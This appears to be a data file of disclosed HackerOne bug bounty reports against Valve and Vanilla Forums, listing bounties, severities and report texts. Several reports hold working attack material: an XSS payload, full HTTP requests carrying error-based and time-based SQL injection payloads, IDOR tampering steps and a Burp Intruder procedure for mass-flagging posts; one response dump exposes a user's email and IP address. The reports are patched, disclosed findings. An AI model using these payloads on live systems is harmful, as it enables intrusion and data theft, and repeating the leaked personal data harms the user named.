This bug affects any service using the SteamWorks DecompressVoice function, which includes Steam itself and most Source engine titles. It can be used on any other client that can hear voice data from the attacker, including on official Valve matchmaking servers in Source games.
In the best case, it is possible for an attacker to utilize the bug as a DoS to crash other clients, and in the worst case it can lead to RCE by using ROP.2 attachments:F1283375: voice_payloadF1283381: CSGOSimple.zip",https://hackerone.com/reports/1180252,Washington,United States,Bellevue,2021,4,29,18,33
Valve,251-500,0.0,100m-200m,"$7,500.00",Critical,9.6,Out-of-bounds Read,CS:GO Server -> Client RCE through OOB access in CSVCMsg_SplitScreen + Info leak in HTTP download,simonscannell  submitted a report to Valve.Jan 4th (2 years ago),https://hackerone.com/reports/1070835,Washington,United States,Bellevue,2021,1,4,0,22
Valve,251-500,0.0,100m-200m,"$1,650.00",Medium,6.8,Information Disclosure,GetGlobalAchievementPercentagesForApp is missing the same release checks as GetSchemaForGame,"xpaw  submitted a report to Valve.Apr 17th (4 years ago)GetGlobalAchievementPercentagesForApp API method can be used to reveal achievement names/percentages for games that have not been released yet.
This is not a problem with GetSchemaForGame method, which leads me to believe the other method is missing all the relevant checks.
https://api.steampowered.com/ISteamUserStats/GetGlobalAchievementPercentagesForApp/v2/?gameid=██████
https://api.steampowered.com/ISteamUserStats/GetSchemaForGame/v1/?appid=████
GetGlobalAchievementPercentagesForApp should have the same release state checks as GetSchemaForGame as to not leak achievement names.
Impact
This can be used to reveal and leak work-in-progress achievements for games that have not been released yet.",https://hackerone.com/reports/541020,Washington,United States,Bellevue,2019,4,17,8,5
Vanilla,11-50,0.0,under-1m,$300.00,High,7.6,None, XSS through chat messages,"vivek111  submitted a report to Vanilla.Aug 28th (3 years ago)vulnerability name: cross site scripting through chat messages
vulnerability description:
cross site scripting is a vulnerability that allows an attacker to send malicious code(usually in javascript form)
to another user
Because a browser cannot know if the script should be trusted or not,
it will execute the script in user context allowing the attacker to access any cookies or sessions tokens retained
by the browser.
payload;
<svg<script> onmou<script>seover</script>=""alert('xss')"">hii</svg</script>>
vulnerable url:http://4gcommunity.vanillacommunities.com/messages/4
## Steps to reproduce:
step 1.Go to http://4gcommunity.vanillacommunities.com/messages/4
step 2 .Go to Add message and send  any one payload as messages
step 3.when victim get messagenotification in bottom left as seen in screenshot,
take cursor over there,it will give ""xss"".
Impact
1-> attacker can be used for stealing cookies
2->As it is through messaging so easily,whomever payload sent will be affected.
POC:Screenshot and video enclosed in attachment2 attachments:F568852: Screenshot_(35).pngF568853: avi.avi",https://hackerone.com/reports/683792,Quebec,Canada,Montreal,2019,8,28,13,53
Vanilla,11-50,0.0,under-1m,$600.00,Critical,9.5,SQL Injection,A SQL injection vulnerability in Vanilla,"balis0ng  submitted a report to Vanilla.May 29th (4 years ago)Summary:
There is a SQL injection vulnerability in the vanilla, an attacker can use this vulnerability to obtain database information.
Description:
in applications/conversations/controllers/class.messagescontroller.php:164
Code 893 BytesWrap lines Copy Download1public function addMessage($conversationID = '') {
2        $this->Form->setModel($this->ConversationMessageModel);
3        if (is_numeric($conversationID) && $conversationID > 0) {
4            $this->Form->addHidden('ConversationID', $conversationID);
5        }
6
7        if ($this->Form->authenticatedPostBack()) {
8            $conversationID = $this->Form->getFormValue('ConversationID', '');
9
10            // Make sure the user posting to the conversation is actually
11            // a member of it, or is allowed, like an admin.
12            if (!checkPermission('Garden.Moderation.Manage')) {
13                $userID = Gdn::session()->UserID;
14                $validConversationMember = $this->ConversationModel->validConversationMember($conversationID, $userID);
15                if (!$validConversationMember) {
16                    throw permissionException();
17                }
18            }
We noticed that the value of $conversationID is controlled by us.It can be an array.
Then we saw that $conversationID was brought into the validConversationMember function.Let's follow in this function.
Code 240 BytesWrap lines Copy Download1    public function validConversationMember($conversationID, $userID) {
2        $conversationMembers = $this->getConversationMembers($conversationID, true, false, false, true);
3        return (in_array($userID, $conversationMembers));
4    }
OK,It is brought into the getConversationMembers function.go on.
Code 987 BytesWrap lines Copy Download1public function getConversationMembers($conversationID, $idsOnly = true, $limit = false, $offset = false, $active = null) {
2        $conversationMembers = [];
3
4        $userConversation = new Gdn_Model('UserConversation');
5        if (is_array($conversationID)) {
6            $where = $conversationID;
7        } else {
8            $where = ['ConversationID' => $conversationID];
9        }
10        if ($active === true) {
11            $where['Deleted'] = 0;
12        } elseif ($active === false) {
13            $where['Deleted'] = 1;
14        }
15        $userMembers = $userConversation->getWhere($where, 'UserID', 'asc', $limit, $offset)->resultArray();
16
17        if (is_array($userMembers) && count($userMembers)) {
18            if ($idsOnly) {
19                $conversationMembers = array_column($userMembers, 'UserID');
20            } else {
21                $conversationMembers = Gdn_DataSet::index($userMembers, 'UserID');
22            }
23        }
24
25        return $conversationMembers;
26    }
You can see that when the value of $conversationID is an array, assign $conversationID directly to $where.
Then $where is brought into the getWhere function.
Code 263 BytesWrap lines Copy Download1   public function getWhere($where = false, $orderFields = '', $orderDirection = 'asc', $limit = false, $offset = false) {
2        $this->_beforeGet();
3        return $this->SQL->getWhere($this->Name, $where, $orderFields, $orderDirection, $limit, $offset);
4    }
Code 593 BytesWrap lines Copy Download1  public function getWhere($table = '', $where = false, $orderFields = '', $orderDirection = 'asc', $limit = false, $offset = 0) {
2        if ($table != '') {
3            //$this->mapAliases($Table);
4            $this->from($table);
5        }
6
7        if ($where !== false) {
8            $this->where($where);
9        }
10
11        if ($orderFields != '') {
12            $this->orderBy($orderFields, $orderDirection);
13        }
14
15        if ($limit !== false) {
16            $this->limit($limit, $offset);
17        }
18
19        $result = $this->query($this->getSelect());
20
21        return $result;
22    }
Keep track of $where.
Code 813 BytesWrap lines Copy Download1public function where($field, $value = null, $escapeFieldSql = true, $escapeValueSql = true) {
2        if (!is_array($field)) {
3            $field = [$field => $value];
4        }
5        foreach ($field as $subField => $subValue) {
6            if (is_array($subValue)) {
7                if (count($subValue) == 1) {
8                    $firstVal = reset($subValue);
9                    $this->where($subField, $firstVal);
10                } else {
11                    $this->whereIn($subField, $subValue);
12                }
13            } else {
14                $whereExpr = $this->conditionExpr($subField, $subValue, $escapeFieldSql, $escapeValueSql);
15                if (strlen($whereExpr) > 0) {
16                    $this->_where($whereExpr);
17                }
18            }
19        }
20        return $this;
21    }
Yeah, you can see we can control the value of the field to cause the injection.
As I said in the vulnerability https://hackerone.com/reports/353784.
## Steps to reproduce:
1.The first step is to enable conversations.
2.We register and log in to an account
3.Construct an injection message. The value of TransientKey can be grabbed from a normal POST packet.
The attack packet that I constructed based on error injection is as follows:
Code 1.04 KiBWrap lines Copy Download1POST /messages/addmessage/ HTTP/1.1
2Host: localhost
3Content-Length: 222
4Pragma: no-cache
5Cache-Control: no-cache
6Accept: application/json, text/javascript, */*; q=0.01
7Origin: http://localhost
8X-Requested-With: XMLHttpRequest
9User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36
10Content-Type: application/x-www-form-urlencoded; charset=UTF-8
11Referer: http://localhost/messages/2
12Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
13Cookie: Drupal.toolbar.collapsed=0; hd_sid=udVsUw; XDEBUG_SESSION=PHPSTORM; Vanilla=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MzAxNTIzMzMsImlhdCI6MTUyNzU2MDMzMywic3ViIjo3fQ.WFdBfYiPUWy_M8N861m3gT1S3LvqpTBfWvqM9WWRUKY; Vanilla-Vv=1527560333; Vanilla-tk=qKz7tUjBiiRQRALz%3A7%3A1527560334%3Aa656c9644245d85d788c83d32d4cc3bd
14Connection: close
15
16TransientKey=qKz7tUjBiiRQRALz&hpt=&ConversationID[1%3d1+or+updatexml(1,concat(0x3e,user()),0)+and+1]=2&Format=Markdown&Body=123123&DeliveryType=VIEW&DeliveryMethod=JSON&Send Message=Send Message&BodyLastMessageID=Message_2
As shown in the figure, the database user name is output:
6.jpg (F302792)
Delayed injection attack message using Union operation is as follows:
Code 1.09 KiBWrap lines Copy Download1POST /messages/addmessage/ HTTP/1.1
2Host: localhost
3Content-Length: 275
4Pragma: no-cache
5Cache-Control: no-cache
6Accept: application/json, text/javascript, */*; q=0.01
7Origin: http://localhost
8X-Requested-With: XMLHttpRequest
9User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36
10Content-Type: application/x-www-form-urlencoded; charset=UTF-8
11Referer: http://localhost/messages/2
12Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
13Cookie: Drupal.toolbar.collapsed=0; hd_sid=udVsUw; XDEBUG_SESSION=PHPSTORM; Vanilla=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MzAxNTIzMzMsImlhdCI6MTUyNzU2MDMzMywic3ViIjo3fQ.WFdBfYiPUWy_M8N861m3gT1S3LvqpTBfWvqM9WWRUKY; Vanilla-Vv=1527560333; Vanilla-tk=qKz7tUjBiiRQRALz%3A7%3A1527560334%3Aa656c9644245d85d788c83d32d4cc3bd
14Connection: close
15
16TransientKey=qKz7tUjBiiRQRALz&hpt=&ConversationID[1%3d1+and+1%3d1+union+select+1,2,3,4,5,6,7,sleep(5),9+union+select+*+from+GDN_UserConversation+where+1]=2&Format=Markdown&Body=123123&DeliveryType=VIEW&DeliveryMethod=JSON&Send Message=Send Message&BodyLastMessageID=Message_2
As shown, delay 5S:
7.jpg (F302796)
The complete SQL statement executed in the database is
select 
from GDN_UserConversation UserConversation
where 1=1 and 1=1 union select 1,2,3,4,5,6,7,sleep(5),9 union select  from GDN_UserConversation where 1 = '2'
and Deleted = '0'
order by UserID asc
## Anything else we should know?
Impact
Only need an ordinary registered member to complete the SQL injection attack, the attacker can manipulate database information through the vulnerability
The hacker selected the SQL Injection weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:
Verified
Yes
What exploitation technique did you utilize?
UNION Operation
Please describe the results of your verification attempt.
observed a 5+ second time delay2 attachments:F302792: 6.jpgF302796: 7.jpgdexterr   posted a comment. May 29th (4 years ago)Hi there. Thank you for submitting this report. It has been assigned to a developer who will assess and provide his feedback.dexterr   changed the status to Triaged. May 30th (4 years ago)This report has been triaged and a patch will be prepared soon. Thank you for reporting.Vanilla  rewarded balis0ng with a $600 bounty. Jul 16th (4 years ago)linc   closed the report and changed the status to Resolved. Sep 23rd (4 years ago)Shipped in 2.6.2, 2.5.5, upcoming 2.7, and previously to cloud.balis0ng   requested to disclose this report. Sep 25th (4 years ago)  This report has been disclosed. Oct 25th (4 years ago)Summary by balis0ngBecause the value of conversationID is controlled by the attacker.The attacker can construct an array and perform SQL injection.
Credit: ADLab of Venustech",https://hackerone.com/reports/358570,Quebec,Canada,Montreal,2018,5,29,4,27
Vanilla,11-50,0.0,under-1m,$150.00,Medium,5.45,Business Logic Errors,A user can comment in private discussions without having permission to access the discussion,"samux  submitted a report to Vanilla.Mar 4th (5 years ago)Hello team,
 I have found a vulnerability which allows a user who does not have access to a discussion to comment on it and thus avoid the control applied. (http://littleguy.vanillastaging.com/)
Proof Of Concept
For this proof of concept I have used 3 users. User A creates a PRIVATE group and invites user B to join it. Subsequently, user A creates a private discussion.
http://littleguy.vanillastaging.com/discussion/15/
This is the private discussion  between User A and User B, obviously you can't have access
Image F269044: private_discussion.png 304.00 KiBZoom in Zoom out Copy Download
Now user C tries to access this discussion however the following is observed
Image F269045: userC_can't_view_this.png 151.00 KiBZoom in Zoom out Copy Download
However, make a comment about any public discussion and you get the following request
Original Request
Code 1.08 KiBWrap lines Copy Download1POST /post/comment/?discussionid=5 HTTP/1.1
2Host: littleguy.vanillastaging.com
3Content-Length: 193
4Accept: application/json, text/javascript, */*; q=0.01
5Origin: http://littleguy.vanillastaging.com
6X-Requested-With: XMLHttpRequest
7User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
8Content-Type: application/x-www-form-urlencoded; charset=UTF-8
9Referer: http://littleguy.vanillastaging.com/discussion/5/here-is-a-test-post
10Accept-Encoding: gzip, deflate
11Accept-Language: en-US,en;q=0.9,es;q=0.8
12Cookie: vf_littleguy_E5VIB=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MjI3MzExNjksImlhdCI6MTUyMDEzOTE2OSwic3ViIjoxNn0.0TFpZFEd9ixdKXLyqvBMNLFz8-H_0lE5T-BKgLcKzbw; vf_littleguy_E5VIB-tk=MwuNaFoQKzhhjRH8%3A16%3A1520139169%3A8576a5cbf8fcff797e8bffc92094d999; __vnf=5a998c58d9794; ; vf_littleguy_E5VIB-Vv=1520141074
13Connection: close
14
15TransientKey=your_token_id&hpt=&DiscussionID=5&CommentID=&DraftID=&Format=Wysiwyg&Body=I'm+user+C%26nbsp%3B&_wysihtml5_mode=1&DeliveryType=VIEW&DeliveryMethod=JSON&Type=Post&LastCommentID=17
Now the user modifies the DiscussionID variable that is in the URI and in the data of the POST by the ID of the private discussion (ID number 15)
Modified Request
Code 1.08 KiBWrap lines Copy Download1POST /post/comment/?discussionid=15 HTTP/1.1
2Host: littleguy.vanillastaging.com
3Content-Length: 194
4Accept: application/json, text/javascript, */*; q=0.01
5Origin: http://littleguy.vanillastaging.com
6X-Requested-With: XMLHttpRequest
7User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
8Content-Type: application/x-www-form-urlencoded; charset=UTF-8
9Referer: http://littleguy.vanillastaging.com/discussion/5/here-is-a-test-post
10Accept-Encoding: gzip, deflate
11Accept-Language: en-US,en;q=0.9,es;q=0.8
12Cookie: vf_littleguy_E5VIB=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MjI3MzExNjksImlhdCI6MTUyMDEzOTE2OSwic3ViIjoxNn0.0TFpZFEd9ixdKXLyqvBMNLFz8-H_0lE5T-BKgLcKzbw; vf_littleguy_E5VIB-tk=MwuNaFoQKzhhjRH8%3A16%3A1520139169%3A8576a5cbf8fcff797e8bffc92094d999; __vnf=5a998c58d9794; ; vf_littleguy_E5VIB-Vv=1520141074
13Connection: close
14
15TransientKey=your_token_id&hpt=&DiscussionID=15&CommentID=&DraftID=&Format=Wysiwyg&Body=I'm+user+C%26nbsp%3B&_wysihtml5_mode=1&DeliveryType=VIEW&DeliveryMethod=JSON&Type=Post&LastCommentID=17
Image F269046: userC_comment_in_private_group.png 232.31 KiBZoom in Zoom out Copy Download
User C has managed to comment on the private discussion
Thanks
Impact
It should be mentioned that here there is a problem at the ID level, all the discussions are generated with consecutive numeric IDs, this means that an attacker could list all the discussions (public and private) and comment on the private ones without authorization.3 attachments:F269044: private_discussion.pngF269045: userC_can't_view_this.pngF269046: userC_comment_in_private_group.pngdexterr   changed the status to Triaged. Mar 5th (5 years ago)Hi there, thank you for submitting this report. It has been triaged as a legitimate exploit and we will prepare a patch as soon as possible.linc   updated the severity from high to medium. Mar 16th (5 years ago)Vanilla  rewarded samux with a $150 bounty. Mar 16th (5 years ago)dexterr   closed the report and changed the status to Resolved. May 23rd (4 years ago)Closing this report as resolved.
    
    
        
            
                
                
                
            
        
    
samux   requested to disclose this report. May 23rd (4 years ago)My friend @dexterr , Could we disclosure this please?  This report has been disclosed. Jun 22nd (4 years ago)",https://hackerone.com/reports/321725,Quebec,Canada,Montreal,2018,3,4,5,31
Vanilla,11-50,0.0,under-1m,$150.00,Medium,5.0,None,A user can create an event in a group without being in it http://littleguy.vanillastaging.com/,"samux  submitted a report to Vanilla.Mar 2nd (5 years ago)Hello again,
I have found another failure other than the #321405 report, in this failure a user can create an event in a group in which he is not.
PoC
I've use two accounts.
With the first one I created the following groups
Image F268608: groups_userA.PNG 14.61 KiBZoom in Zoom out Copy Download
User B has joined the group Hello, therefore creates an event in that group
Image F268609: userb_create_new_event_hello_group.jpg 89.43 KiBZoom in Zoom out Copy Download
Image F268611: uberb_group_pentesting.PNG 28.00 KiBZoom in Zoom out Copy Download
You can see that user B can not create an event since he is not in the group
Now user B is going to create a new event in the group Hello
Image F268612: userb_event_group_hello.jpg 90.63 KiBZoom in Zoom out Copy Download
Now user B modifies the group ID by the ID of the pentesting group (as we saw in the previous report the corresponding ID was number 4)
Image F268613: userb_event_group_pentesting.jpg 97.73 KiBZoom in Zoom out Copy Download
Finally, user B creates the new event
Image F268617: new_event_created_by_userB.jpg 85.05 KiBZoom in Zoom out Copy Download
Thanks
Impact
A user can create events in a group without being in it, in this way it is possible to show that there is no adequate filter to avoid this6 attachments:F268608: groups_userA.PNGF268609: userb_create_new_event_hello_group.jpgF268611: uberb_group_pentesting.PNGF268612: userb_event_group_hello.jpgF268613: userb_event_group_pentesting.jpgF268617: new_event_created_by_userB.jpgdexterr   changed the status to Triaged. Mar 2nd (5 years ago)Howdy, thank you for submitting this issue. We have triaged it as a legitimate exploit we'll prepare a patch as soon as possible.linc   updated the severity from high to medium (5.0). Mar 16th (5 years ago)Vanilla  rewarded samux with a $150 bounty. Mar 16th (5 years ago)
    
    
        
            
                
                
                
            
        
    
samux   posted a comment. Mar 28th (5 years ago)Any update with this? Thanksdexterr   closed the report and changed the status to Resolved. May 15th (5 years ago)This has been patched and deployed. Closing this report.
    
    
        
            
                
                
                
            
        
    
samux   requested to disclose this report. May 15th (5 years ago)Thanks, Can we do this publicly?  This report has been disclosed. Jun 14th (4 years ago)",https://hackerone.com/reports/321410,Quebec,Canada,Montreal,2018,3,2,15,1
Vanilla,11-50,0.0,under-1m,$150.00,Medium,6.5,Improper Access Control - Generic,Accessing Private Files Shared in message of other users,"geekboy  submitted a report to Vanilla.Aug 9th (5 years ago)###Description:
Users can send message to each other as well as attach and share the files as well, and the flow is like once user upload the file on the server, the file get assigned by unique id named MediaIDs which is vulnerable for IDOR.
###Step To Reproduce:

Get logged into account!
Send text msg with attachment to other test account.
Intercept the request which send the msg!
Change the value of MediaIDs and replace with any other id.
You will get the accessible url of that file the response which belong to some other users. 

Exploitability:

Attacker can extract all the private files shared between all the users.

###Possible Fix:

Maintain the access control properly.

Please let me know if any more info needed !

- Geekboy!",https://hackerone.com/reports/258260,Quebec,Canada,Montreal,2017,8,9,13,41
Vanilla,11-50,0.0,under-1m,$300.00,High,8.3,Business Logic Errors,"Abusing ""Report as abuse"" functionality to delete any user's post.","h1-squirtle  submitted a report to Vanilla.Sep 18th (4 years ago)Hi Team,
Greetings!!
Description:
I would like to report a vulnerability that can be used to delete any user’s post by abusing “Report an abuse” function within application. After specific number of reports submitted to server, it automatically deletes that post of user.
Application has functionality where one user can report for abusive post or content of another user. An attacker can send multiple abuse report for the victim’s post from one account to delete user’s post. 
Steps to reproduce:

Login with attacker's credentials in browser and victim’s credentials in incognito mode of browser 
Post some text or other content through victim’s account on his own wall.
Now open attacker’s account and goto victim’s wall or profile. You will see the content posted by victim. 
Set up any proxy intercepting tool with the browser (I’m using Burp Suite) and start intercepting requests
Click on “Flag” of victim’s post and select “Abuse”. Capture this request in Burpsuite and send to Intruder tab
Goto “Position” tab and select “clear”
Now goto Payload tab and select “Payload type” as “Null Payloads”
Under the payload options select “Continue indefinably”
Now goto “Options” tab and set number of threads “100”
Click on start attack. After 900 requests reload the page.
If post is still exist, wait for more payloads to be executed.
After specific number of successful payloads post will get deleted. 
You can verify with attacker’s as well as victim’s account also

Mitigations:
Application should also verify source of ""Abusive flags"". If requests are being submitted from one account, block the requests.
Impact
An attacker can use this vulnerability to delete any user’s post by sending multiple abuse flags to server. Server is not verifying report’s source as it only verifying report’s quantity, so attacker can send multiple reports from one account and get victim’s post deleted.
Attacker can delete multiple posts by abusing this vulnerability in reputed forums and posts which have got high attention or number of likes, LOLs and comments.",https://hackerone.com/reports/411075,Quebec,Canada,Montreal,2018,9,18,13,14
Vanilla,11-50,0.0,under-1m,$150.00,Medium,5.45,Privilege Escalation,Able to Select Every Poll Option[http://tedwebers-famous-loudspeakers.vanillacommunities.com],"tikoo_sahil  submitted a report to Vanilla.Mar 15th (5 years ago)Summary:
Hello
I would like to report a bug in which i was able to select multiple poll options even when a user is only allowed to select a single option.
Description:
In the New discussion are of the site http://tedwebers-famous-loudspeakers.vanillacommunities.com , there is an option to create a new poll , so when i tried to create a poll with four options , using proxy i was able to replay four requests with four different poll id's and was successful in selecting all four options which should not have been allowed.
## Steps to reproduce:
1.Open  http://tedwebers-famous-loudspeakers.vanillacommunities.com
2. Go to Discussions tab
3. Select New Poll option
4 Create a Poll
5. Select one of the options of the poll
6. Capture the request in Burp
7. Replay the request By changing the Poll Option ID in request 
The output can be seen below:-
Image F272656: votes.png 21.40 KiBZoom in Zoom out Copy Download
Patch:-
There should be mapping of the user id who has given a vote with the poll option id.
Regards
sahil tikoo
Impact
A user can give multiple votes in a Poll which should not be allowed , such parameter tampering can result in malfunction of poll voting functionality.1 attachment:F272656: votes.png",https://hackerone.com/reports/326434,Quebec,Canada,Montreal,2018,3,15,20,48
Vanilla,11-50,0.0,under-1m,$150.00,Medium,4.3,Improper Access Control - Generic,Conversation API Leaks Details Of UnAuthorized Conversations,"mindingdata  submitted a report to Vanilla.Aug 16th (3 years ago)Summary:
If a user creates a conversations, and then leaves, all API calls and web access to that conversation is locked down. Except for one particular API call which allows you to see details about ongoing conversations you have since left as long as you created the conversation in the first place. 
Steps to reproduce:

Ensure that the ""member"" role has API Token access. 
Create a new user with this role, and send a conversation to anyone. 
Leave said conversation. 
On the web/API calls to read this conversation and message should fail. However you should still be able to do the following API call :
https://vanilla.com:444/api/v2/conversations/?insertuserid=yourUserId&access_token=accessToken
Which leaks details like who has been added to the conversation after you left, extra messages etc. 

Code Details
I noticed that most calls to conversations run through the method inConversation which checks whether a user is still in the conversation, and if they have left they don't have access to it. But I assume this was too heavy to run in this particular API call because it returns a list. 
For this particular API call if you don't pass in the insertuserid param, then it will indeed check the userconversation table and make sure you are still participating in the conversation. But if you pass in insertuserid it instead bypasses this check and just returns all conversations you started, irrespective if you are still in them.
Impact
Gain information about conversations they no longer have access to.",https://hackerone.com/reports/674866,Quebec,Canada,Montreal,2019,8,16,6,40
Vanilla,11-50,0.0,under-1m,$150.00,Medium,5.45,None,disclosure of email by sending a message.,"haxta4ok00  submitted a report to Vanilla.Mar 19th (5 years ago)Summary:
When you send a message, the E-mail field is created. Thus, through the format of json, we can see the email of the user to whom we sent the letter
Description:
Steps to reproduce:

Create a message, select the user whose mail we want to open.

message.png (F273484)
messageID.png (F273485)
2. Send a message and add the json format at the end of the message number.
JsonMessageGiveMeEmail.png (F273483)
I do not understand your policy page and I do not quite understand which subdomains are included in the scope, and if this forum is not included in your scope -- sorry.
Sorry i bad speak english
I hope you understand me
Thank you,haxta4ok00
Impact
disclosure of email by sending a message.3 attachments:F273483: JsonMessageGiveMeEmail.pngF273484: message.pngF273485: messageID.png",https://hackerone.com/reports/327200,Quebec,Canada,Montreal,2018,3,19,4,32
Vanilla,11-50,0.0,under-1m,$300.00,High,7.95,Information Disclosure,Forum Users Information Disclosure,"fahimeh  submitted a report to Vanilla.Mar 2nd (5 years ago)Summary:
An unauthorized (even unauthenticated) user is able to view some private information about forum users. this information includes: email address (even if the user not allows it), IP address of the user, data of some of the private messages between two users.
Description:
by brute forcing ActivityIDs in the forum (I know about the rate limit of the bruteforce but it was still possible to get so many private infos, though it took so much time! ) , information of that activity ( IP address, type of activity and some data) are sent back to the unauthorized user.
## Steps to reproduce:

sign in the forum and send a comment on your dashboard/activities . the request should look like this:

POST /dashboard/activity/comment HTTP/1.1
Host: 9thsecurity.vanillaforums.com
User-Agent:
Accept: application/json, text/javascript, /; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer:
Content-Length: 132
Cookie:
Connection: close
TransientKey=LgFniB9ii5sAgDbG&hpt=&ActivityID=1021&Return=activity%2Fpost%2F127'&Body=anything&DeliveryType=VIEW&DeliveryMethod=JSON
2.as you see there is a parameter called ""ActivityID"" , change the value and the relevant activity info will be sent to you in the response. for instance for the above ActivityID, part of response is like this:
{
""Activity"": {
""ActivityID"": 1021,
""ActivityTypeID"": 28,
""NotifyUserID"": 78,
""ActivityUserID"": 12,
""RegardingUserID"": null,
""Photo"": ""https://us.v-cdn.net/5022309/uploads/userpics/870/nQ2FNQ1B5RDRG.jpg"",
""HeadlineFormat"": ""{ActivityUserID,User} sent you a <a href=\""{Url,html}\"">message</a>"",
""Story"": ""Hello Emeketos, what is your handle name for RSI? Just need to know for updating ship catalog. "",
""Format"": ""Html"",
""Route"": ""/messages/61#285"",
""RecordType"": ""Conversation"",
""RecordID"": 61,
""InsertUserID"": 12,
""DateInserted"": ""2014-10-04 06:05:35"",
""InsertIPAddress"": ""209.131.62.115"",
""DateUpdated"": ""2014-10-04 06:05:35"",
""Notified"": 2,
""Emailed"": 2,
""Data"": [],
""FullHeadline"": ""%1$s sent you a %8$s."",
""ProfileHeadline"": ""%1$s sent you a %8$s."",
""AllowComments"": 0,
""ShowIcon"": 0,
""RouteCode"": ""message"",
""ActivityType"": ""ConversationMessage"",
""ActivityName"": ""defaunt"",
""ActivityEmail"": ""ceravix@aol.com"",
""ActivityGender"": ""u"",
""ActivityPhoto"": ""https://us.v-cdn.net/5022309/uploads/userpics/870/nQ2FNQ1B5RDRG.jpg"",
""RegardingName"": null,
""RegardingEmail"": null,
""RegardingGender"": null,
""RegardingPhoto"": null,
""PhotoUrl"": ""http://9thsecurity.vanillaforums.com/messages/61#285"",
""Url"": ""http://9thsecurity.vanillaforums.com/messages/61#285"",
""Headline"": ""<a href=\""/profile/defaunt\"">defaunt</a> sent you a <a href=\""http://9thsecurity.vanillaforums.com/messages/61#285\"">message</a>""
},
this is message from a user called defaunt. as you see the email address, IP address , the gender and the context of her message is shown to us. however if you try to open the message url directly, you'll see the error saying you don't have permission to view this.
Anything else we should know?
there is no need to be logged in to send this request and get the response. I logged out of my account and I could still get the result. session management problem also exist.
also, I attached some of the responses I got.
Impact
the leaked information is highly sensitive and threatens users privacy.5 attachments:F268375: vanilla-1.pngF268376: vanilla-2.pngF268377: vanilla-3.pngF268378: vanilla5.pngF268379: vanilla-6.png",https://hackerone.com/reports/321249,Quebec,Canada,Montreal,2018,3,2,0,30
Vanilla,11-50,0.0,under-1m,$150.00,Medium,5.45,Denial of Service,Making further registrations difficult on Vanilla forum,"krishnaverma  submitted a report to Vanilla.Mar 23rd (5 years ago)Summary:
After registering the account, user gets a verification email. There is a number assigned in that mail and it is incremented for next user. Trying to verify the next number with same code shows user not found but will create problem for next person registering the account.
Description:
Steps to reproduce:


Register an account on https://open.vanillaforums.com . I registered with alpesh73768@gmail.com and username alpesh73768


You will get a confirmation mail like https://open.vanillaforums.com/entry/emailconfirm/67421/nSBDdPuH2zdZlRYiYCgvnYJZOUCmZMLE


If you just change the number here 67421 and increment by 1 , url becomes, https://open.vanillaforums.com/entry/emailconfirm/67422/nSBDdPuH2zdZlRYiYCgvnYJZOUCmZMLE  
Load this url in browser and you will get error ""user not found""

Now when next user tries to register on the site he will see this error on registering "" user 67422 not found"".  Adding the image below

Image- Vanilla 1

If he again tries with same details, he will get error:

The name you entered is already used by another member
The email is entered i already used by another member
Image- Vanilla 2.

This user will also get no confirmation email in his email id. Only if he logs in and then sends a verification email again, he will be able to use the account.

Let me know if you need any more information.
Impact
Can be abused to prevent registrations on the forum. Not a standard practice for a reputed forum.2 attachments:F277950: vanilla1.pngF277952: vanilla2.png",https://hackerone.com/reports/329209,Quebec,Canada,Montreal,2018,3,23,14,51
Vanilla,11-50,0.0,under-1m,$300.00,Medium,5.45,Improper Access Control - Generic,Overwrite Drafts of Everyone ,"geekboy  submitted a report to Vanilla.Aug 9th (5 years ago)###Description:
Users have option to save drafts before doing comment on posts or discussions, where DraftID parameter is get passed to keep the draft record and if attacker replace this id with any existing id it will simple overwrite that record without checking the permission he that user is allowed to access that draft or not.
Sample Post request:
Code 1.06 KiBWrap lines Copy Download1POST /post/comment/?discussionid=17598 HTTP/1.1
2Host: open.vanillaforums.com
3User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0
4Accept: application/json, text/javascript, */*; q=0.01
5Accept-Language: en-US,en;q=0.5
6Content-Type: application/x-www-form-urlencoded; charset=UTF-8
7X-Requested-With: XMLHttpRequest
8Referer: https://open.vanillaforums.com/discussion/17598/have-you-noticed-the-new-like-button-on-vanillaforums-org
9Content-Length: 185
10Cookie: <Redacted>
11DNT: 1
12Connection: close
13
14TransientKey=JnZOUDaSl3N7Qviz&SomeRequiredField=&DiscussionID=17598&CommentID=&DraftID=&Format=Markdown&Body=aasdsa&DeliveryType=VIEW&DeliveryMethod=JSON&Type=Draft&LastCommentID=247998
15```
16+ Replace/add value to `DraftID` with any existing values of any user and it will simply overwrite that data.
17
18{F210848}
19
20###Exploitability: 
21+ Attacker can iterate through all the ID and overwrite/remove the drafts of other users.
22
23###Possible Fix:
24-----------
25+ Check for permission. 
26
27
28Please let me know if any more info needed !
29
30-------------
31
32__*- Geekboy!*__1 attachment:F210848: 2017-08-09_14-47-17.mp4",https://hackerone.com/reports/258201,Quebec,Canada,Montreal,2017,8,9,9,20
Vanilla,11-50,0.0,under-1m,$150.00,Medium,5.0,Violation of Secure Design Principles,Spoofing the redirect process using RTLO,"flex0geek  submitted a report to Vanilla.May 3rd (4 years ago)Hi team,
Description:
I was testing this subdomain rinkerboats.vanillacommunities.com and after some search, I found this path
